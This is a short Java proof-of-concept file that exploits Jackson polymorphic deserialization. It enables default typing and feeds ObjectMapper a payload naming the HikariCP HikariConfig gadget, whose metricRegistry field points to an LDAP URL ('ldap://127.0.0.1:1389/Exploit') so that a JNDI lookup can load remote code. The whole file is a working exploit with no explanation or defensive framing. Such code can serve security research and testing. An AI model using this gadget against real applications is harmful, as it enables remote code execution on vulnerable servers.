package com.test.jackson;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * @Author:Wadewfsssss
 */

public class HikariJndi {

    public static void main(String[] args) throws Exception {
        String payload = "[\"com.zaxxer.hikari.HikariConfig\", {\"metricRegistry\":\"ldap://127.0.0.1:1389/Exploit\"}]";
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        mapper.readValue(payload,Object.class);
    }
}
